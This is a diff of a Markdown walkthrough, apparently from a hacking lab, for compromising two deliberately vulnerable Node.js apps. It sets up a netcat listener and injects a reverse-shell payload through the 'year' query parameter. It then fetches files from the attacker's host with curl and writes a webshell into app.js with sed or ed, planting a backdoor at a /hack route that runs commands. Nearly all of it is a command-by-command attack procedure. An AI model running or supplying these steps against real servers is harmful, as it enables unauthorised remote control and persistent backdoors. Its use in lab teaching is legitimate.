@@ -1,15 +1,17 @@
 <h1 align="center">1 Initial Stage</h2>
 
+`(h)` = hacker terminal, `(v)` = netcat reverse shell, `tcs` = The Cutlery Shop, `wity` = What Is The Year.
+
 ## 1.1 Start a netcat listener
 Before performing the attack, the hacker machine must host a web server. Which will listen for [reverse tcp](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/) connections, the following example uses [openbsd-netcat](https://man.openbsd.org/nc.1).
 ```
-nc -lvnp 8000
+(h) $ nc -lvnp 8000
 ```
 
 ## 1.2 Customise payload details
 Open a terminal and find out the local IPv4 address of your hacker machine.
 ```
-ip addr
+(h) $ ip addr
 ```
 Open [revshell.js](./revshell.js) and modify it according to the IPv4 address of your hacker machine.
 ```
@@ -21,21 +23,21 @@ Open [revshell.js](./revshell.js) and modify it according to the IPv4 address of
 ### Method 1 - Copy Paste
 Copy the contents of the [revshell.js](./revshell.js) file.
 ```
-xclip -in payload/Linux/revshell.js -selection clipboard
+(h) $ xclip -in payload/Linux/revshell.js -selection clipboard
 ```
 And paste the contents of [revshell.js](revshell.js) into the `year` HTTP GET Query
 ```
-curl -G --data-urlencode "year=<payload>" http://<victim-ip>:3000
+(h) $ curl -G --data-urlencode "year=<payload>" http://<victim-ip>:3000
 ```
 ### Method 2 - Server/Client
 Host a server in the `payload/Linux` directory from the hacker machine
 ```
-cd payload/Linux
-python -m http.server 5000
+(h) $ cd payload/Linux
+(h) $ python -m http.server 5000
 ```
 Then use cURL to inject the payload to the victim web server
 ```
-curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/revshell.js)" http://<victim-ip>:3000
+(h) $ curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/revshell.js)" http://<victim-ip>:3000
 ```
 
 ## 1.4 Injecting payload into "The Cutlery Shop" web app
@@ -70,32 +72,27 @@ The reverse shell provides us the privilege of the compromised user, but it is a
 
 The [wity-webshell.js](../Webshells/wity-webshell.js) and [tcs-webshell.js](../Webshells/tcs-webshell.js) files contains a snippet of code prepared in advance, which adds a webshell to the NodeJS application. You must use the appropriate webshell file matching the name of the web app you are running.
 
-__Note:__ `tcs` = The Cutlery Shop, `wity` = What Is The Year
-
 ## 2.2 Creating Webshell File
 It is slightly inconvenient to create text files with very specific contents from a primitive reverse shell. Here are some of the techniques that I use to create malicious files on the server.
 
 ### Method 1 - Cat Command
 Using the `cat` linux command create a file on the victim's server, by manually typing or pasting the contents of webshell file, excluding the `...` like so:
 ```
-(victim) $ cat > webshell.js <<EOF
+(v) $ cat > webshell.js <<EOF
 ... PASTE PAYLOAD HERE ...
 EOF
 ```
-__Note:__ Typing `EOF` will end the command make sure to paste the code before typing `EOF` at the end.
 
-### Method 2 - File Download
+### Method 2 - File Upload
 Host a web server from the `payload` directory
 ```
-(hacker) $ cd payload
-(hacker) $ php -S 0.0.0.0:5000
+(h) $ cd payload
+(h) $ php -S 0.0.0.0:5000
 ```
 Then use the reverse shell to download it on the victim's machine.  
 ```
-(victim) $ curl -O http://<hacker-ip>:5000/webshell.js
+(v) $ curl -O http://<hacker-ip>:5000/webshell.js
 ```
-
-__Note:__ `hacker` is a local terminal session and `victim` is the netcat reverse shell
 
 ## 2.3 Editing Important Files
 The most important file in both web applications is the `app.js` file. Because it contains all the routes to the frontend pages, but in a real scenario, files of interests may vary. 
@@ -105,17 +102,17 @@ Here are two methods of editing files without the help of popular command line t
 ### Method 1 - Sed (Stream Editor)
 Using [GNU sed](https://en.wikipedia.org/wiki/Sed) we can output the contents of `webshell.js` on a specific line number in the `app.js` file. The following will tell `sed` to go to line 39 before the `app.listen()` call, and READ the contents of `webshell.js` into it.
 ```
-sed -i "39r webshell.js" app.js
+(v) $ sed -i "39r webshell.js" app.js
 ```
 
 ### Method 2 - Ed (Line Editor)
 [GNU ed](https://en.wikipedia.org/wiki/Ed_(text_editor)) is also a viable alternative to output the contents of webshell payload to the appropriate line number. But unlike `sed` which is utilised to automate changes to files, `ed` is developed by Ken Thompson for human-centric usage on paper roll terminals back in August 1969.
 ```
-ed -s app.js <<EOF
-39r webshell.js
-w
-q
-EOF
+(v) $ ed -s app.js <<EOF
+(v) $ 39r webshell.js
+(v) $ w
+(v) $ q
+(v) $ EOF
 ```
 
 ## Using The Backdoor
@@ -124,7 +121,7 @@ The payload will spawn a webshell which you can access from the `/hack` route in
 
 Using the cURL program
 ```
-curl -G --data-urlencode "cmd=<command>" http://<victim-ip>:3000/hack
+(h) $ curl -G --data-urlencode "cmd=<command>" http://<victim-ip>:3000/hack
 ```
 
 Using a web browser
